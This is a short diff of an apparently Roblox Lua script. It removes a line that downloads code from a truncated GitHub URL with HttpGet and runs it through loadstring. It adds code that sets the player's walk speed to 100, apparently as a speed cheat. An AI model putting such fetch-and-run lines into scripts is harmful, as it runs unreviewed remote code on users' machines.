@@ -1,2 +1,6 @@
-wait("0.2")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/carscar5..."))()
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+humanoid.WalkSpeed = 100
+
